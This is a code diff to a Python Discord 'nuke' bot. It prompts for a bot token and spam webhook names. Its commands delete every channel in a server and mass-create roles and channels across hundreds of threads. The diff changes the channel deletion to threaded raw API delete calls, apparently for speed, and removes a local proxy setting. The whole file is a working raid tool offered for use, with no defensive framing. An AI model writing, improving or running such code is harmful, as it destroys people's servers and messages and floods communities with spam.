@@ -10,7 +10,10 @@ ftime = now.strftime("%H:%M:%S")
 
 session = requests.Session()
 
-token = input("Bot Token: ")
+
+
+
+token = input("Token: ")
 prefix = input("Prefix: ")
 stats = input("Status: ")
 chan = input("Channel Name: ")
@@ -20,7 +23,7 @@ webname = input("Spam Webhook names: ")
 amountss = 1000
 intents = discord.Intents().all()
 intents.message_content = True
-bot = commands.Bot(command_prefix=prefix, intents=intents,proxy="http://localhost:7890")
+bot = commands.Bot(command_prefix=prefix, intents=intents)
 bot.remove_command("help")
 
 if bot:
@@ -88,8 +91,7 @@ async def scr(ctx):
         session.post(
            f"https://discord.com/api/v9/guilds/{guild}/roles",
            headers=headers,
-           json=json,
-           
+           json=json
         )
     for i in range(250):
            threading.Thread(
@@ -107,8 +109,11 @@ async def sdr(ctx):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild.id
-    for channel in list(ctx.guild.channels):
-        await channel.delete()
+    def dc(i):
+        session.delete(
+          f"https://discord.com/api/v9/channels/{i}",
+          headers=headers
+        )
     def cc(i):
         json = {
           "name": i
@@ -116,8 +121,7 @@ async def nuke(ctx):
         session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
-          json=json,
-          
+          json=json
         )
     for i in range(250):
            for channel in list(ctx.guild.channels):   
